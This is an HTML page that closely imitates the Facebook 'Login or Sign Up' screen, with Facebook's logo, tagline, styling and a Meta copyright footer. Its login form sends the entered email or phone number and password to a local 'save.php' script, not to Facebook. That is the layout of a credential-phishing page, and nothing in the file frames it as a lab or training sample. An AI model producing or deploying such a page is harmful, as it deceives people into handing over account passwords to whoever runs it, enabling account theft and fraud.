<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Login or Sign Up</title>

    <style>
        * {
            padding: 0;
            margin: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Poppins', sans-serif;
            background-color: #f0f2f5;
            color: #1c1e21;
        }

        main {
            min-height: 90vh;
            width: 100%;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            max-width: 1000px;
            width: 100%;
            gap: 40px;
        }

        .colm-logo {
            flex: 1;
        }

        .colm-logo img {
            max-width: 320px;
        }

        .colm-logo h2 {
            font-size: 26px;
            font-weight: 400;
            margin-top: 20px;
            line-height: 32px;
        }

        .colm-form {
            flex: 1;
            text-align: center;
        }

        .form-container {
            background-color: #ffffff;
            border-radius: 10px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1),
                        0 8px 16px rgba(0, 0, 0, 0.1);
            padding: 20px;
            max-width: 400px;
            margin: 0 auto 20px;
        }

        .form-container form input,
        .btn-login {
            width: 100%;
            height: 45px;
            margin: 5px 0;
            font-size: 16px;
            padding: 0 8px;
        }

        .form-container form input {
            border: 1px solid #dddfe2;
            border-radius: 6px;
        }

        .form-container form input:focus {
            border-color: #1877f2;
            box-shadow: 0 0 0 2px #e7f3ff;
        }

        /* Login button */
        .btn-login {
            background-color: #1877f2;
            border: none;
            border-radius: 6px;
            color: white;
            font-size: 20px;
            font-weight: 700;
            cursor: pointer;
        }

        .btn-login:hover {
            background-color: #166fe5;
        }

        .form-container a {
            display: block;
            color: #1877f2;
            font-size: 14px;
            padding: 10px 0 20px;
            border-bottom: 1px solid #dadde1;
            text-decoration: none;
        }

        /* Create account button */
        .btn-new {
            background-color: #42b72a;
            border: none;
            border-radius: 6px;
            font-size: 17px;
            color: white;
            font-weight: 700;
            width: 100%;
            height: 48px;
            margin-top: 20px;
            cursor: pointer;
        }

        .btn-new:hover {
            background-color: #36a420;
        }

        .colm-form p {
            font-size: 14px;
        }

        footer {
            background-color: white;
            padding: 20px 0;
        }

        footer ol {
            list-style: none;
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
        }

        footer ol li {
            font-size: 12px;
            color: #385898;
        }

        footer small {
            display: block;
            margin-top: 10px;
            font-size: 11px;
        }

       
        @media (max-width: 900px) {
            .row {
                flex-direction: column;
                text-align: center;
            }

            .colm-logo img {
                margin: 0 auto;
            }

            .colm-logo h2 {
                padding: 0 20px;
                font-size: 22px;
            }

            .form-container {
                width: 100%;
            }
        }

        @media (max-width: 480px) {
            .colm-logo img {
                max-width: 250px;
            }

            .colm-logo h2 {
                font-size: 18px;
                line-height: 24px;
            }

            .btn-login {
                font-size: 18px;
            }

            .btn-new {
                font-size: 15px;
            }

            footer ol {
                gap: 5px;
            }
        }
    </style>
</head>

<body>

    <main>
        <div class="row">

            <div class="colm-logo">
                <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Logo">
                <h2>Facebook helps you connect and share with the people in your life.</h2>
            </div>

            <div class="colm-form">
                <div class="form-container">

                   <form action="save.php" method="POST">
                    <input type="text" name="email" placeholder="Email address or phone number" required>
                    <input type="password" name="password" placeholder="Password" required>

                    <button type="submit" class="btn-login">Login</button>

                    <a href="#">Forgotten password?</a>

                    <button type="button" class="btn-new">Create new Account</button>
                </form>


                </div>

                <p>
                    <a href="#"><b>Create a Page</b></a> for a celebrity, brand or business.
                </p>
            </div>

        </div>
    </main>

    <footer>
        <div class="footer-contents">
            <ol>
                <li>English (UK)</li>
                <li><a href="#">മലയാളം</a></li>
                <li><a href="#">தமிழ்</a></li>
                <li><a href="#">తెలుగు</a></li>
                <li><a href="#">বাংলা</a></li>
                <li><a href="#">اردو</a></li>
                <li><a href="#">हिन्दी</a></li>
                <li><a href="#">ಕನ್ನಡ</a></li>
                <li><a href="#">Español</a></li>
                <li><a href="#">Português (Brasil)</a></li>
                <li><a href="#">Français (France)</a></li>
                <li><button>+</button></li>
            </ol>
            <small>Meta © 2025</small>
        </div>
    </footer>

</body>
</html>
